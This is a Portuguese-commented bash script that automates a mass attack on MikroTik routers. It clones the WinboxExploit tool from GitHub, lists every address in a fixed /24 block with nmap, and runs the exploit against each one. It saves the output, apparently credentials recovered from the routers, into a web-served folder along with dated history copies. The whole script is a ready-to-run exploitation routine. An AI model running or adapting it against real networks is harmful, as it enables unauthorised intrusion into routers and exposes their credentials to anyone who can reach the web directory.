#!/bin/bash

#yum -y update
#yum -y install net-tools
#yum -y install nmap
#yum -y groupinstall development
#yum -y install https://centos7.iuscommunity.org/ius-release.rpm
#yum -y install python36u
#yum -y install python-pip
#yum -y install git
#Gera a data com o dia para documentar os arquivos
DATA=$(date +"%d-%m-%Y-%T")
DATA2=$(date +"%d-%m-%Y %T")
#apaga tudo que tem dentro da pasta mikrotik, porque pode gerar erros na coleta se tiver arquivos dentro (não apaga o histórico)
rm -rf /var/www/html/nmap/mikrotik/*
#Uma mensagem que aparece enquanto faz o exploit
CARREGAMENTO="realizando procura... espere por favor"
#Defina aqui o ASN do bloco a ser escaneado, o único local que deve ser modificado do script
ASN="168.232.56.0/24"
#cria pastas necessárias
mkdir /var/www/html/nmap/mikrotik
#entra na pasta
cd /var/www/html/nmap/mikrotik
#um simples echo para documentar que é da rr64

#coleta via comando GIT o repositorio atualizado do exploit do mikrotik
git clone https://github.com/BigNerd95/WinboxExploit.git
#entra na pasta do exploit
cd WinboxExploit
#printa pro usuário a mensagem no painel de dashboard
echo $CARREGAMENTO >> /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt
#cria a lista de ips com uma função do nmap
nmap -sL $ASN| grep "Nmap scan report" | awk '{print $NF}' >> /var/www/html/nmap/mikrotik/WinboxExploit/resultado2.txt
#temos um while preenchendo todos os ips nas linhas seguintes
while read linha
do
VAR1=$(cat /var/www/html/nmap/mikrotik/WinboxExploit/resultado2.txt)
NOME=$(echo $VAR1 | awk '{print $1}')
#aqui é feito o exploit com python 3.6, e o resultado sai em /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt
python3.6 WinboxExploit.py $linha >> /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt
done < resultado2.txt
#rremove linhas desnecessárias para deixar o arquivo mais limpo e fácil de entender
rm -rf /var/www/html/nmap/mikrotik/WinboxExploit/resultado2.txt
sed -i '/Connection/d' /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt 
sed -i '/failed/d' /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt 
sed -i '/error/d' /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt
sed -i '/realizando/d' /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt


#documenta a data do exploit em /var/www/html/nmap/mikrotik/data.txt
echo $DATA2 >> /var/www/html/nmap/mikrotik/data.txt
#cria se não tiver a pasta a seguir para histórico
mkdir  /var/www/html/nmap/historico_mikrotik/
#copia o resultado exploit para um arquivo com data do dia de hoje, ou seja, sempre teremos um arquivo novo e documentado
cp /var/www/html/nmap/mikrotik/WinboxExploit/resultado.txt /var/www/html/nmap/historico_mikrotik/exploit_$DATA.txt


